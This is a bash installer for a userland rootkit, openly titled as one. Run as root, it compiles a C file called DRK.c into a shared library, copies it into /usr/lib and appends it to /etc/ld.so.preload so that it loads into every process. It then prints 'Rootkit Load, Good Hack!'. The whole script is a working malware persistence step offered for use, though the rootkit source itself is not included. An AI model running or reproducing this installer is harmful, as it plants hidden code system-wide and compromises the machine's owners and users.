#!/usr/bin/env bash
# INSTALL ROOTKIT USERLAND

if [ $(whoami) = "root" ]; then

# Loading
echo -en "\033[32m[+] Install\033[0m"

for load in $(seq 1 3); do
echo  -n "."
sleep 0.5;
done

# compilation
/usr/bin/gcc DRK.c -o libcz.so -shared -fPIC -ldl

# moved dynamic library for /usr/bin
mv libcz.so /usr/lib

#LD_PRELOAD
echo "/usr/lib/libcz.so" >> /etc/ld.so.preload
ldconfig

#clear screen
clear

echo -e "\033[32m[!] Rootkit Load, Good Hack! Open New Terminal.\033[0m"

else

echo -e "\033[31m[!] Run With ROOT!\033[0m"

fi
